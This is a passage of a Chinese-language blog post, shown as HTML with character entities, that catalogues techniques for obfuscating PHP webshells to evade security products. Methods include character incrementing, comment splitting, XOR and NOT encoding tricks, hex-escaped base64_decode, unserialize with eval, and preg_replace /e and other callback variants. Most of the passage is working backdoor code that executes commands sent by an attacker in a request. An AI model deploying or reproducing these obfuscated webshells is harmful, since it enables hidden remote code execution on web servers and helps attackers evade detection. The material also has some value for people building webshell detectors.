<p>&#x901A;&#x8FC7;&#x5F02;&#x6216;&#x8FD0;&#x7B97;(<code>^</code>)&#x3001;&#x53D6;&#x53CD;&#x8FD0;&#x7B97;(<code>!</code>)&#x7684;&#x65B9;&#x5F0F;&#x7EC4;&#x6210;&#x4E00;&#x4E2A;webshell&#x3002;</p>
<h3 id="&#x81EA;&#x589E;&#x8FD0;&#x7B97;"><a href="#&#x81EA;&#x589E;&#x8FD0;&#x7B97;" class="headerlink" title="&#x81EA;&#x589E;&#x8FD0;&#x7B97;"></a>&#x81EA;&#x589E;&#x8FD0;&#x7B97;</h3><p>&#x56E0;&#x4E3A;&#x5728;PHP&#x4E2D;&#xFF0C;<code>&apos;a&apos;++ =&gt; &apos;b&apos;</code>&#xFF0C;<code>&apos;b&apos;++ =&gt; &apos;c&apos;</code>,&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x5982;&#x679C;&#x5F97;&#x5230;&#x4E86;&#x5176;&#x4E2D;&#x7684;&#x4E00;&#x4E2A;&#x5B57;&#x6BCD;&#xFF0C;&#x901A;&#x8FC7;&#x8FD9;&#x4E2A;&#x5B57;&#x7B26;&#x5C31;&#x53EF;&#x4EE5;&#x5F97;&#x5230;&#x6240;&#x6709;&#x7684;&#x5B57;&#x6BCD;&#x3002;&#x901A;&#x8FC7;<code>$_=[];$_=@&quot;$_&quot;;;</code>&#x5F97;&#x5230;<code>$_</code>&#x4E3A;<code>Array</code>&#x7684;&#x5B57;&#x7B26;&#x4E32;&#xFF0C;&#x90A3;&#x4E48;&#x5C31;&#x53EF;&#x4EE5;&#x5F97;&#x5230;&#x6240;&#x6709;&#x7684;&#x5B57;&#x7B26;&#x4E32;&#x4E86;&#x3002;</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&#x590D;&#x5236;&#x4EE3;&#x7801;$_=[];</span><br><span class="line">$_=@&quot;$_&quot;; // $_=&apos;Array&apos;;</span><br><span class="line">$_=$_[&apos;!&apos;==&apos;@&apos;]; // $_=$_[0];</span><br><span class="line">$___=$_; // A</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;</span><br><span class="line">$___.=$__; // S</span><br><span class="line">$___.=$__; // S</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++; // E </span><br><span class="line">$___.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R</span><br><span class="line">$___.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T</span><br><span class="line">$___.=$__;</span><br><span class="line">$____=&apos;_&apos;;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P</span><br><span class="line">$____.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O</span><br><span class="line">$____.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S</span><br><span class="line">$____.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T</span><br><span class="line">$____.=$__;</span><br><span class="line"></span><br><span class="line">$_=?____;</span><br><span class="line">$___(base64_decode($_[_])); // ASSERT($_POST[_]);</span><br></pre></td></tr></table></figure>

<p>&#x5173;&#x4E8E;&#x8FD9;&#x79CD;&#x7531;&#x7279;&#x6B8A;&#x5B57;&#x7B26;&#x7EC4;&#x6210;&#x7684;webshell&#x53EF;&#x4EE5;&#x53C2;&#x8003;P&#x795E;&#x5199;&#x7684;<a href="/external_links/afb2271c1b1fd1a2f5ac85c8fceb6f20.html" target="blank" rel="noopener">&#x4E00;&#x4E9B;&#x4E0D;&#x5305;&#x542B;&#x6570;&#x5B57;&#x548C;&#x5B57;&#x6BCD;&#x7684;webshell</a></p>
<h3 id="&#x5229;&#x7528;&#x6CE8;&#x91CA;"><a href="#&#x5229;&#x7528;&#x6CE8;&#x91CA;" class="headerlink" title="&#x5229;&#x7528;&#x6CE8;&#x91CA;"></a>&#x5229;&#x7528;&#x6CE8;&#x91CA;</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x590D;&#x5236;&#x4EE3;&#x7801;@$_=&quot;s&quot;.&quot;s&quot;./*-/*-*/&quot;e&quot;./*-/*-*/&quot;r&quot;;</span><br><span class="line">@$_=/*-/*-*/&quot;a&quot;./*-/*-*/$_./*-/*-*/&quot;t&quot;;</span><br><span class="line">@$_/*-/*-*/($/*-/*-*/{&quot;_P&quot;./*-/*-*/&quot;OS&quot;./*-/*-*/&quot;T&quot;}</span><br><span class="line">[/*-/*-*/0/*-/*-*/-/*-/*-*/2/*-/*-*/-/*-/*-*/5/*-/*-*/]); // &#x5BC6;&#x7801;-7</span><br></pre></td></tr></table></figure>

<p>&#x901A;&#x8FC7;&#x7279;&#x8272;&#x7B26;&#x53F7;&#x548C;&#x6CE8;&#x91CA;&#x7EC4;&#x5408;&#x7EC4;&#x6210;&#x4E00;&#x4E2A;webshell&#xFF0C;&#x4E5F;&#x80FD;&#x591F;&#x9690;&#x85CF;&#x5173;&#x952E;&#x5B57;&#x3002;</p>
<h2 id="&#x5F02;&#x6216;&#x8FD0;&#x7B97;-amp-&#x5B57;&#x7B26;&#x7F16;&#x7801;"><a href="#&#x5F02;&#x6216;&#x8FD0;&#x7B97;-amp-&#x5B57;&#x7B26;&#x7F16;&#x7801;" class="headerlink" title="&#x5F02;&#x6216;&#x8FD0;&#x7B97;&amp;&#x5B57;&#x7B26;&#x7F16;&#x7801;"></a>&#x5F02;&#x6216;&#x8FD0;&#x7B97;&amp;&#x5B57;&#x7B26;&#x7F16;&#x7801;</h2><p>&#x8FD9;&#x79CD;&#x5F02;&#x6216;&#x8FD0;&#x7B97;&#x5F97;&#x5230;&#x7684;webshell&#x4E0E;&#x4E0A;&#x9762;&#x8BB2;&#x7684;&#x901A;&#x8FC7;&#x5F02;&#x6216;&#x8FD0;&#x7B97;&#x4E0D;&#x5B8C;&#x5168;&#x4E00;&#x6837;&#x3002;&#x5728;&#x7279;&#x5B9A;&#x7684;&#x7F16;&#x7801;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x4E00;&#x4E9B;&#x5B57;&#x7B26;&#x4E32;&#x7ECF;&#x8FC7;&#x5F02;&#x6216;&#x8FD0;&#x7B97;&#x5C31;&#x80FD;&#x591F;&#x5F97;&#x5230;&#x4E00;&#x4E9B;&#x7279;&#x5B9A;&#x7684;&#x51FD;&#x6570;&#xFF0C;&#x8FD9;&#x4E9B;&#x51FD;&#x6570;&#x5C31;&#x53EF;&#x4EE5;&#x7528;&#x4E8E;&#x6784;&#x9020;webshell&#x3002;</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x590D;&#x5236;&#x4EE3;&#x7801;$y=~&#x7763;&#x803D;&#x5B69;^&apos;(1987)&apos;;</span><br><span class="line">$y($_POST[1987]);</span><br></pre></td></tr></table></figure>

<p>&#x4E0A;&#x8FF0;&#x7684;&#x4EE3;&#x7801;&#x9700;&#x8981;&#x4EE5;<code>GBK</code>&#x7684;&#x65B9;&#x5F0F;&#x4FDD;&#x5B58;,&#x5176;&#x4E2D;&#x7684;<code>$y</code>&#x7684;&#x503C;&#x4E3A;<code>assert</code>&#xFF0C;&#x8FD9;&#x6837;&#x5C31;&#x662F;&#x4E00;&#x4E2A;&#x5178;&#x578B;&#x7684;webshell&#x4E86;&#x3002;</p>
<p>&#x8FD8;&#x6709;&#x5982;&#x4E0B;&#x8FD9;&#x79CD;&#xFF1A;</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x590D;&#x5236;&#x4EE3;&#x7801;$x=~&#x178;&#xAC;&#xAC;&#xBA;&#xAD;&#xAB;;</span><br><span class="line">$x($_POST[~&#xB9;&#xB9;&#xCF;&#xCF;&#xCF;&#xCF;]);</span><br></pre></td></tr></table></figure>

<p>&#x4E0A;&#x8FF0;&#x7684;&#x4EE3;&#x7801;&#x9700;&#x8981;&#x4EE5;<code>ISO-8859-15</code>&#x4FDD;&#x5B58;&#xFF0C;&#x5176;&#x4E2D;&#x7684;<code>$x</code>&#x4E3A;<code>assert</code>,&#x800C;<code>~&#xB9;&#xB9;&#xCF;&#xCF;&#xCF;&#xCF;</code>&#x662F;<code>FF0000</code>&#x3002;&#x5373;&#x4F7F;&#x662F;&#x8FD9;&#x79CD;&#x65B9;&#x5F0F;&#xFF0C;&#x90E8;&#x5206;&#x7684;&#x9632;&#x62A4;&#x8F6F;&#x4EF6;&#x8FD8;&#x662F;&#x80FD;&#x591F;&#x8BC6;&#x522B;&#x3002;</p>
<h2 id="eval-amp-base64-decode&#x53D8;&#x5F62;"><a href="#eval-amp-base64-decode&#x53D8;&#x5F62;" class="headerlink" title="eval&amp;base64_decode&#x53D8;&#x5F62;"></a>eval&amp;base64_decode&#x53D8;&#x5F62;</h2><p>&#x901A;&#x8FC7;&#x5BF9;&#x5927;&#x91CF;&#x7684;webshell&#x5206;&#x6790;&#xFF0C;&#x53D1;&#x73B0;&#x5F88;&#x591A;&#x7684;webshell&#x5176;&#x5B9E;&#x90FD;&#x662F;<code>eval(base64_decode($_POST[cmd]))</code>&#x8FD9;&#x79CD;&#x65B9;&#x5F0F;&#x7684;&#x53D8;&#x5F62;&#x3002;&#x53D8;&#x5F62;&#x7684;&#x6838;&#x5FC3;&#x601D;&#x60F3;&#x5176;&#x5B9E;&#x5C31;&#x662F;&#x5C06;<code>base64_decode</code>&#x3001;<code>$_POST</code>&#x9690;&#x85CF;&#x3002;&#x4E0B;&#x9762;&#x5C31;&#x5BF9;&#x8FD9;&#x51E0;&#x79CD;&#x53D8;&#x5F62;&#x7684;&#x65B9;&#x6CD5;&#x8FDB;&#x884C;&#x8BF4;&#x660E;&#x3002;</p>
<h3 id="&#x5B57;&#x7B26;&#x4E32;-amp-&#x6570;&#x7EC4;&#x7684;&#x65B9;&#x5F0F;"><a href="#&#x5B57;&#x7B26;&#x4E32;-amp-&#x6570;&#x7EC4;&#x7684;&#x65B9;&#x5F0F;" class="headerlink" title="&#x5B57;&#x7B26;&#x4E32;&amp;&#x6570;&#x7EC4;&#x7684;&#x65B9;&#x5F0F;"></a>&#x5B57;&#x7B26;&#x4E32;&amp;&#x6570;&#x7EC4;&#x7684;&#x65B9;&#x5F0F;</h3><p>&#x8FD9;&#x79CD;&#x65B9;&#x5F0F;&#x4E00;&#x822C;&#x90FD;&#x662F;&#x5148;&#x58F0;&#x660E;&#x5B57;&#x7B26;&#x4E32;&#xFF0C;&#x4E4B;&#x540E;&#x901A;&#x8FC7;&#x4ECE;&#x5B57;&#x7B26;&#x4E32;&#x4E2D;&#x8FDB;&#x884C;&#x53D6;&#x503C;&#xFF0C;&#x5F97;&#x5230;&#x6240;&#x9700;&#x8981;&#x7684;&#x654F;&#x611F;&#x51FD;&#x6570;&#x3002;&#x5982;&#x4E0B;&#xFF1A;</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#x590D;&#x5236;&#x4EE3;&#x7801;$sF = &quot;PCT4BA6ODSE_&quot;;</span><br><span class="line">$s21 = strtolower($sF[4] . $sF[5] . $sF[9] . $sF[10] . $sF[6] . $sF[3] . $sF[11] . $sF[8] . $sF[10] . $sF[1] . $sF[7] . $sF[8] . $sF[10]);</span><br><span class="line">$s22 = ${strtoupper($sF[11] . $sF[0] . $sF[7] . $sF[9] . $sF[2])}[&apos;n985de9&apos;];</span><br><span class="line">if (isset($s22)) {</span><br><span class="line">    eval($s21($s22));</span><br><span class="line">}</span><br></pre></td></tr></table></figure>

<p>&#x901A;&#x8FC7;&#x5B57;&#x7B26;&#x4E32;<code>PCT4BA6ODSE_</code>&#x5F97;&#x5230;,<code>$s21</code>&#x4E3A;<code>base64_decode</code>,<code>$s22</code>&#x4E3A;<code>${&quot;_POST&quot;}[&apos;n985de9&apos;]</code>,&#x6240;&#x4EE5;&#x8FD9;&#x79CD;&#x65B9;&#x5F0F;&#x6700;&#x540E;&#x7684;&#x4EE3;&#x7801;&#x5176;&#x5B9E;&#x5C31;&#x662F;<code>eval(base64_decode($_POST[&apos;n985de9&apos;]));</code></p>
<h3 id="&#x8FDB;&#x5236;&#x8F6C;&#x6362;"><a href="#&#x8FDB;&#x5236;&#x8F6C;&#x6362;" class="headerlink" title="&#x8FDB;&#x5236;&#x8F6C;&#x6362;"></a>&#x8FDB;&#x5236;&#x8F6C;&#x6362;</h3><p>&#x8FD9;&#x79CD;&#x65B9;&#x5F0F;&#x5728;webshell&#x4E2D;&#x4E5F;&#x662F;&#x6BD4;&#x8F83;&#x5E38;&#x89C1;&#x7684;&#x3002;</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x590D;&#x5236;&#x4EE3;&#x7801;$v230c590=&quot;\x62\x61\163\x65\x36\x34\137\144\145\x63\x6f\144\145&quot;;</span><br><span class="line">@eval($v230c590(.....</span><br></pre></td></tr></table></figure>

<p>&#x5176;&#x4E2D;<code>$v230c590</code>&#x5C31;&#x662F;<code>base64_decode</code>&#xFF0C;&#x901A;&#x8FC7;&#x5341;&#x516D;&#x8FDB;&#x5236;&#x548C;&#x516B;&#x8FDB;&#x5236;&#x6DF7;&#x7528;&#x7684;&#x65B9;&#x5F0F;&#x4EE3;&#x66FF;<code>base64_decode</code>&#x3002;&#x8FD8;&#x6709;&#x5982;&#x4E0B;&#x8FD9;&#x79CD;&#x5F62;&#x5F0F;</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x590D;&#x5236;&#x4EE3;&#x7801;$liner = &quot;pr&quot;.&quot;e&quot;.&quot;g_&quot;.&quot;re&quot;.&quot;p&quot;.&quot;l&quot;.&quot;ace&quot;;</span><br><span class="line">$liner(&quot;/.*/e&quot;,&quot;\x65\x76\x61\x6C\x28\x67\x7A\x75\x6E\x63\x6F\x6D\x70\x72\x65\x73\x73\x28\x62\x61\x73\x65\x36\x34\x5F\x64\x65\x63\x6F\x64\x65\x28&quot;,php_code);</span><br></pre></td></tr></table></figure>

<p>&#x5176;&#x4E2D;<code>\x65\x76\x61\x6C\x28\x67\x7A\x75\x6E\x63\x6F\x6D\x70\x72\x65\x73\x73\x28\x62\x61\x73\x65\x36\x34\x5F\x64\x65\x63\x6F\x64\x65\x28</code>&#x5176;&#x5B9E;&#x4E3A;<code>eval(gzuncompress(base64_decode(</code>&#x4E5F;&#x8FBE;&#x5230;&#x4E86;&#x9690;&#x85CF;&#x654F;&#x611F;&#x51FD;&#x6570;&#x7684;&#x76EE;&#x7684;&#x3002;</p>
<h2 id="&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x6267;&#x884C;"><a href="#&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x6267;&#x884C;" class="headerlink" title="&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x6267;&#x884C;"></a>&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x6267;&#x884C;</h2><p>&#x901A;&#x8FC7;&#x5E8F;&#x5217;&#x5316;&#x7684;&#x65B9;&#x5F0F;&#xFF0C;&#x6211;&#x4EEC;&#x4E5F;&#x80FD;&#x591F;&#x6267;&#x884C;webshell&#x3002;</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#x590D;&#x5236;&#x4EE3;&#x7801;class foo{</span><br><span class="line">    public $data=&quot;text&quot;;</span><br><span class="line">    function __destruct()</span><br><span class="line">    {</span><br><span class="line">        eval($this-&gt;data);</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line">$file_name=$_GET[&apos;id&apos;];</span><br><span class="line">unserialize($file_name);</span><br></pre></td></tr></table></figure>

<p>&#x6211;&#x4EEC;&#x9700;&#x8981;&#x5728;&#x672C;&#x5730;&#x6784;&#x9020;&#x5E8F;&#x5217;&#x5316;&#x7684;&#x6570;&#x636E;&#x3002;&#x6784;&#x9020;&#x597D;&#x4E86;&#x4E4B;&#x540E;&#xFF0C;&#x901A;&#x8FC7;<code>shell.php?id=id=O:3:&quot;foo&quot;:1:{s:4:&quot;data&quot;;s:10:&quot;phpinfo();&quot;;}</code>&#xFF0C;&#x8FD9;&#x6837;&#x5C31;&#x80FD;&#x591F;&#x6267;&#x884C;<code>phpinfo();</code>&#x547D;&#x4EE4;&#x4E86;&#x3002;</p>
<h2 id="&#x56DE;&#x8C03;&#x51FD;&#x6570;"><a href="#&#x56DE;&#x8C03;&#x51FD;&#x6570;" class="headerlink" title="&#x56DE;&#x8C03;&#x51FD;&#x6570;"></a>&#x56DE;&#x8C03;&#x51FD;&#x6570;</h2><p>PHP&#x4E2D;&#x7684;&#x56DE;&#x8C03;&#x51FD;&#x6570;&#x975E;&#x5E38;&#x4E4B;&#x591A;&#xFF0C;&#x6240;&#x4EE5;&#x901A;&#x8FC7;&#x56DE;&#x8C03;&#x51FD;&#x6570;&#x6267;&#x884C;Webshell&#x7684;&#x65B9;&#x5F0F;&#x4E5F;&#x975E;&#x5E38;&#x7684;&#x591A;&#x3002;&#x6700;&#x5E38;&#x89C1;&#x7684;&#x56DE;&#x8C03;&#x51FD;&#x6570;&#x7684;&#x5199;&#x6CD5;&#x5C31;&#x662F;<code>$ant=create_function(&quot;&quot;,&quot;eval($_POST[cmd]);&quot;);$ant();</code>&#x3002;&#x4F46;&#x662F;&#x76EE;&#x524D;&#x5927;&#x90E8;&#x5206;&#x7684;&#x9632;&#x62A4;&#x8F6F;&#x4EF6;&#x90FD;&#x90FD;&#x5DF2;&#x7ECF;&#x80FD;&#x591F;&#x8BC6;&#x522B;&#x8FD9;&#x79CD;&#x5199;&#x6CD5;&#x7684;webshell&#xFF0C;&#x6240;&#x4EE5;&#x76EE;&#x524D;&#x7684;&#x56DE;&#x8C03;&#x51FD;&#x6570;&#x65B9;&#x6CD5;&#x53D8;&#x5F62;&#x4E00;&#x822C;&#x90FD;&#x662F;&#x901A;&#x8FC7;&#x5176;&#x4ED6;&#x7684;&#x4E0D;&#x5E38;&#x89C1;&#x7684;&#x56DE;&#x8C03;&#x51FD;&#x6570;&#x4EE5;&#x53CA;&#x53D8;&#x6362;&#x5173;&#x952E;&#x4EE3;&#x7801;&#x3002;</p>
<h3 id="create-function&#x7684;&#x53D8;&#x5F62;"><a href="#create-function&#x7684;&#x53D8;&#x5F62;" class="headerlink" title="create_function&#x7684;&#x53D8;&#x5F62;"></a>create_function&#x7684;&#x53D8;&#x5F62;</h3><p>&#x57FA;&#x4E8E;create_function&#x7684;&#x53D8;&#x5F62;&#x662F;&#x975E;&#x5E38;&#x591A;&#x7684;&#x3002;&#x5982;&#x4E0B;&#x9762;&#x4E24;&#x79CD;&#xFF1A;</p>
<p>&#x53D8;&#x5F62;&#x4E00;&#xFF1A;</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x590D;&#x5236;&#x4EE3;&#x7801;$function = create_function(&apos;$code&apos;,strrev(&apos;lave&apos;).&apos;(&apos;.strrev(&apos;TEG_$&apos;).&apos;[&quot;code&quot;]);&apos;);$function();</span><br></pre></td></tr></table></figure>

<p>&#x53D8;&#x5F62;&#x4E8C;&#xFF1A;</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x590D;&#x5236;&#x4EE3;&#x7801;$function = create_function(&apos;$code&apos;,base64_decode(&apos;ZXZhbCgkX0dFVFsidGVzdCJdKTs=&apos;));</span><br><span class="line">$function();</span><br></pre></td></tr></table></figure>

<p>&#x603B;&#x4F53;&#x6765;&#x8BF4;&#x8FD9;&#x79CD;&#x65B9;&#x6CD5;&#x548C;&#x4E0A;&#x9762;&#x8BB2;&#x7684;<strong>&#x5173;&#x952E;&#x5B57;&#x66FF;&#x6362;</strong>&#x662F;&#x7C7B;&#x4F3C;&#x7684;</p>
<h3 id="preg-replace&#x53D8;&#x5F62;"><a href="#preg-replace&#x53D8;&#x5F62;" class="headerlink" title="preg_replace&#x53D8;&#x5F62;"></a>preg_replace&#x53D8;&#x5F62;</h3><p>&#x901A;&#x8FC7;<code>preg_replace</code>&#x7684;<code>\e</code>&#x6A21;&#x5F0F;&#x4E0B;&#x80FD;&#x591F;&#x6267;&#x884C;&#x4EE3;&#x7801;&#x8FD9;&#x79CD;&#x65B9;&#x5F0F;&#x4E5F;&#x662F;&#x5341;&#x5206;&#x5E38;&#x89C1;&#x7684;&#xFF0C;&#x5F88;&#x591A;&#x653B;&#x51FB;&#x8005;&#x90FD;&#x559C;&#x6B22;&#x4F7F;&#x7528;<code>preg_replace</code>&#x3002;&#x4E0B;&#x9762;&#x5C31;&#x63D0;&#x4F9B;&#x4E09;&#x79CD;&#x53D8;&#x5F62;&#x3002;</p>
<p>&#x53D8;&#x5F62;&#x4E00;&#xFF1A;</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x590D;&#x5236;&#x4EE3;&#x7801;@$a = $_POST[&apos;x&apos;];</span><br><span class="line">if (isset($a)) {</span><br><span class="line">    @preg_replace(&quot;/\[(.*)\]/e&quot;, &apos;\\1&apos;, base64_decode(&apos;W0BldmFsKGJhc2U2NF9kZWNvZGUoJF9QT1NUW3owXSkpO10=&apos;));</span><br><span class="line">}</span><br></pre></td></tr></table></figure>

<p>&#x901A;&#x8FC7;base64&#x7F16;&#x7801;&#x5C06;&#x5173;&#x952E;&#x4EE3;&#x7801;&#x9690;&#x85CF;&#x3002;</p>
<p>&#x53D8;&#x5F62;&#x4E8C;&#xFF1A;</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x590D;&#x5236;&#x4EE3;&#x7801;function funfunc($str) {}</span><br><span class="line">echo preg_replace(&quot;/&lt;title&gt;(.+?)&lt;\/title&gt;/ies&quot;, &apos;funfunc(&quot;\1&quot;)&apos;, $_POST[&quot;cmd&quot;]);</span><br></pre></td></tr></table></figure>

<p>&#x8FD9;&#x79CD;&#x65B9;&#x5F0F;&#x5176;&#x5B9E;&#x8FD8;&#x5229;&#x7528;&#x4E86;PHP&#x4E2D;&#x7684;&#x53EF;&#x53D8;&#x53D8;&#x91CF;&#x80FD;&#x591F;&#x6267;&#x884C;&#x4EE3;&#x7801;&#x7684;&#x7279;&#x70B9;&#x3002;&#x901A;&#x8FC7;<code>cmd=&lt;title&gt;${@eval($_POST[xxx])}&lt;/title&gt;&amp;xxx=phpinfo();</code>&#x8FD9;&#x79CD;&#x65B9;&#x5F0F;&#x5C31;&#x53EF;&#x4EE5;&#x6267;&#x884C;&#x4EFB;&#x610F;&#x7684;&#x4EE3;&#x7801;&#x4E86;&#x3002;</p>
<p>&#x53D8;&#x5F62;&#x4E09;&#xFF1A;</p>
<p>&#x5728;php&#x4E2D;&#x4E5F;&#x6709;&#x51E0;&#x4E2A;&#x548C;preg_replace&#x7C7B;&#x4F3C;&#x7684;&#x51FD;&#x6570;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#xFF0C;&#x5982;<code>mb_ereg_replace</code>&#x3001;<code>preg_filter</code>&#x3002;&#x7528;&#x6CD5;&#x5982;&#x4E0B;&#xFF1A;</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x590D;&#x5236;&#x4EE3;&#x7801;mb_ereg_replace(&apos;.*&apos;, $_REQUEST[&apos;pass&apos;], &apos;&apos;, &apos;e&apos;);</span><br><span class="line">echo preg_filter(&apos;|.*|e&apos;, $_REQUEST[&apos;pass&apos;], &apos;&apos;);</span><br></pre></td></tr></table></figure>

<p>&#x5728;PHP&#x4E2D;&#x8FD9;&#x79CD;&#x52A8;&#x6001;&#x51FD;&#x6570;&#x662F;&#x975E;&#x5E38;&#x591A;&#x7684;&#xFF0C;&#x9664;&#x4E86;&#x4E0A;&#x8FF0;&#x8BF4;&#x7684;<code>create_function</code>,<code>preg_replace</code>&#xFF0C;&#x8FD8;&#x6709;&#x8BF8;&#x5982;<code>call_user_func</code>&#x3001; <code>call_user_func_array</code>&#x3002;&#x8FD8;&#x53EF;&#x4EE5;&#x5229;&#x7528;&#x4E00;&#x4E9B;&#x4E0D;&#x5E38;&#x89C1;&#x7684;&#x56DE;&#x8C03;&#x51FD;&#x6570;&#xFF0C;&#x5982;<code>array_map</code>&#x3001;<code>array_filter</code>&#x3001;<code>array_reduce</code>&#x3001;<code>array_udiff</code>&#x8FD9;&#x79CD;&#x65B9;&#x5F0F;&#xFF0C;&#x8FD8;&#x6709;&#x5F88;&#x591A;&#x5176;&#x4ED6;&#x7684;&#x56DE;&#x8C03;&#x51FD;&#x6570;&#x53EF;&#x4F9B;&#x4F7F;&#x7528;&#x3002;P&#x795E;&#x4E5F;&#x5199;&#x8FC7;&#x4E00;&#x7BC7;&#x5173;&#x4E8E;&#x7528;&#x56DE;&#x8C03;&#x51FD;&#x6570;&#x6784;&#x9020;webshell&#x7684;&#x6587;&#x7AE0;&#xFF0C;<br> <a href="/external_links/2885fc31917aa380cac80d6373f984e6.html" target="blank" rel="noopener">&#x521B;&#x9020;tips&#x7684;&#x79D8;&#x7C4D;&#x2014;&#x2014;PHP&#x56DE;&#x8C03;&#x540E;&#x95E8;</a>&#x3002;</p>
<h3 id="&#x52A8;&#x6001;&#x51FD;&#x6570;&#x6267;&#x884C;"><a href="#&#x52A8;&#x6001;&#x51FD;&#x6570;&#x6267;&#x884C;" class="headerlink" title="&#x52A8;&#x6001;&#x51FD;&#x6570;&#x6267;&#x884C;"></a>&#x52A8;&#x6001;&#x51FD;&#x6570;&#x6267;&#x884C;</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x590D;&#x5236;&#x4EE3;&#x7801;$dyn_func = $_GET[&apos;dyn_func&apos;];</span><br><span class="line">$argument = $_GET[&apos;argument&apos;];</span><br><span class="line">$dyn_func($argument);</span><br></pre></td></tr></table></figure>

<p>&#x8FD9;&#x79CD;&#x52A8;&#x6001;&#x51FD;&#x6570;&#x7684;&#x53D8;&#x5F62;&#x76EE;&#x524D;&#x5DF2;&#x7ECF;&#x88AB;&#x5E7F;&#x6CDB;&#x5730;&#x4F7F;&#x7528;&#xFF0C;&#x76EE;&#x524D;&#x5927;&#x90E8;&#x5206;&#x7684;&#x9632;&#x62A4;&#x8F6F;&#x4EF6;&#x90FD;&#x80FD;&#x591F;&#x8BC6;&#x522B;&#x3002;</p>
